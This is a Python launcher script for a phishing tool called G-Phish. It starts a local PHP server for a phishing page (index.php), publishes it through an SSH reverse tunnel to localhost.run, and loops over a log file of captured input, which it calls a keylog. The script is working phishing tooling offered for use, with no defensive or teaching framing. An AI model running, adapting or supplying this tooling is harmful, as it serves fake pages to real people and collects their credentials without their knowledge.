import warnings
import os, time
from sys import platform
from sys import exit
import pyfiglet as figlet
warnings.filterwarnings("ignore")

if platform == "win32":
  clear = "cls"
else:
  clear = "clear"

if os.path.isfile("index.php"):
  file_exists = 1
else:
  print("Error : index.php not Found\nReinstall from : https://github.com/D4RKH0R1Z0N/gphish")
  exit()

os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 3")
time.sleep(1)
os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 2")
time.sleep(1)
os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 1")
time.sleep(1)
os.system(clear)

def program():
  banner = figlet.figlet_format("G-Phish", font = 'small')

  def log_get():
    time.sleep(1)
    os.system(clear)
    print(banner)
    print("[ G-Phish Log ]\n")
    log = open("log.txt", "r").read()
    print(log)

  print(banner)
  log = open("log.txt", "w")
  log.write("")
  log.close()
  print("Starting...")
  os.system("start php -S localhost:8080")
  os.system("start ssh -R 80:localhost:8080 nokey@localhost.run")
  os.system("cls")
  print(banner)
  print("Running...")
  time.sleep(1)
  while True:
    log_get()

try:
  while True:
    program()
except KeyboardInterrupt:
  print("Keylog save as : log.txt")
  print("\nExitting...")
  exit(0)